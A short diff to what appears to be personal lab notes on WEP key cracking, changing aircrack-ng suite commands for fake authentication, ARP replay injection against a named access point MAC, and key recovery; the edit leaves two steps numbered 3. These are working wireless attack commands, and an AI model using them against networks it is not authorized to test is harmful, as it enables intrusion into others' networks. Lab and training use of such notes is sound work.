@@ -91,8 +91,9 @@ network={
 ## WEP key cracking
 - airodump-ng wlan0mon --band abg -c 3 -w wep
 
-1. sudo aireplay-ng -1 0 -a F0:9F:C2:71:22:11 -c 3E:C8:44:0A:24:BA wlan0mon
-2. sudo aireplay-ng -3 -b F0:9F:C2:71:22:11 -h 3E:C8:44:0A:24:BA wlan0mon
+1. aireplay-ng -1 3600 -a F0:9F:C2:71:22:11 -c 64:32:A8:56:32:56 wlan0mon
+2. aireplay-ng -3 -b F0:9F:C2:71:22:11 -h 64:32:A8:56:32:56 wlan0mon
+3. aireplay-ng -1 10 -a F0:9F:C2:71:22:11 -c 64:32:A8:56:32:56 wlan0mon
 3. aircrack-ng wep.cap
 
 ## Connecting to the WEP network
